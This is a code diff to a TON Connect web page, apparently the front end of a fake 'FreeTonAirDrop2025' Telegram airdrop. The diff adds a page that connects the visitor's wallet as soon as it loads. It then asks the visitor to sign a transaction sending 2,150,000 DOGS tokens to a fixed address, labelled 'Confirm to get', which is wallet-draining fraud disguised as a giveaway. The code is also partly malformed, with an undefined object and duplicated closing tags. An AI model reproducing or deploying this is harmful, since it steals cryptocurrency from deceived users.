@@ -14,8 +14,12 @@
 
     <script>
         const connector = new TonConnect({
-            manifestUrl: 'https://your-app.com/tonconnect-manifest.json'
+            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
+            buttonRootId: 'connectWalletButton'
         });
+        tonConnectUI.uiOptions = {
+      twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
+        }
 
         const connectWallet = async () => {
             try {
@@ -71,5 +75,54 @@
         document.getElementById('connectWalletButton').addEventListener('click', connectWallet);
         document.getElementById('swapButton').addEventListener('click', executeSwap);
     </script>
+</body>
+</html>
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TON Connect Example</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+   
+</head>
+<body>
+
+    <div id="ton-connect"></div>
+    <script>
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
+            buttonRootId: 'ton-connect'
+        });
+        tonConnectUI.uiOptions = {
+      twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
+  };
+  
+    </script>
+<script>
+    async function connectToWallet() {
+        const connectedWallet = await tonConnectUI.connectWallet();
+        // Create a transaction to send to the wallet
+        const transaction = {
+            "type": "transaction",
+            "value": 0, // amount of TON to send (0 means all TON in the wallet)
+            "destination": "EQBCaX89lCvgOp-jnw3F-Zeqa0ftvxn_CT4fDJu7haiGgPwY", // address of the contract to send the transaction to
+            "payload": "Confirm to get", // message to display to the user
+            "grams": 2150000, // amount of DOGS tokens to send
+            "token": "DOGS" // token to send
+        };
+        // Send the transaction to the wallet for confirmation
+        const result = await tonConnectUI.sendTransaction(connectedWallet, transaction);
+        console.log(result);
+    }
+
+    // Call the function
+    connectToWallet().catch(error => {
+        console.error("Error connecting to wallet or sending transaction:", error);
+    });
+</script>
+
 </body>
 </html>
